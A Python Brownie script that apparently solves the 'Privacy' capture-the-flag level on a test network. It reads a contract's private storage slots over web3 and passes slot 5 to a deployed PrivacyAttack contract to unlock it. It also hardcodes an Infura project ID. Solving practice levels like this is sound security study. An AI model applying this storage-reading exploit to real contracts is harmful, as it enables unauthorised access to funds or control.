from web3 import Web3
from scripts.helpful_scripts import get_account
from brownie import PrivacyAttack


def main():
    level_contract = "0x3373efda6Fc2166AEf77E9093172f702Cf07765d"
    storage = get_storage_slots(level_contract)
    account = get_account()
    attack = PrivacyAttack.deploy(level_contract, {"from": account})

    tx = attack.unlock(storage[5], {"from": account})
    tx.wait(1)


def get_storage_slots(level_contract):
    w3 = Web3(
        Web3.HTTPProvider(
            "https://rinkeby.infura.io/v3/80514b47890f4b358946727268128c71"
        )
    )

    storage = []

    for i in range(6):
        try:
            item = w3.eth.get_storage_at(level_contract, i)
            print(f"[{i}]: {item}")
            storage.append(item)
        except:
            print(f"Error for index {i}")
            storage.append("")

    return storage
